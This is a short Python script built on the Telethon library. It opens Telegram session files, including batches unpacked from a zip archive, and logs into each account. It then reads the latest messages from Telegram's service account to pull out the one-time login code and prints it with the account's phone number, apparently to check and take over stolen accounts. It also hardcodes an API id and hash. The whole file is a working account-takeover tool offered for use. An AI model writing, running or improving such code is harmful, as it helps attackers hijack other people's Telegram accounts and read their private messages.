import os
import zipfile
import re
from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.errors.rpcerrorlist import AuthKeyDuplicatedError

api_id = 22815381
api_hash = "de80983b057a7f8e22a88b8a83c21d20"

def extract_session_from_zip(zip_path, extract_to="sessions"):
    os.makedirs(extract_to, exist_ok=True)
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)
    return [os.path.join(extract_to, f) for f in os.listdir(extract_to) if f.endswith('.session')]

def get_otp_from_session(session_file):
    try:
        client = TelegramClient(session_file, api_id, api_hash)
        client.connect()
        if not client.is_user_authorized():
            client.disconnect()
            return "[X] Session is not authorized or is invalid."
        user = client.get_me()
        posts = client(GetHistoryRequest(peer=777000, limit=2))
        otp = None
        for msg in posts.messages:
            match = re.search(r'\d{5,}', msg.message)
            if match:
                otp = match.group()
                break
        client.disconnect()
        if otp:
            return f"[✓] Phone: +{user.phone}\n[✓] OTP: {otp}"
        else:
            return "[X] OTP not found in last 2 messages."
    except AuthKeyDuplicatedError:
        return "[X] Error: The key was used under two different IP"
    except Exception as e:
        return f"[X] Error: {e}"

if __name__ == '__main__':
    print("Paste here the path to your .zip or .session file:")
    file_path = input().strip().replace('"','')
    if file_path.endswith('.zip'):
        session_files = extract_session_from_zip(file_path)
    else:
        session_files = [file_path]
    for session_file in session_files:
        print(f"Checking: {session_file}")
        print(get_otp_from_session(session_file))
        print("-" * 32)
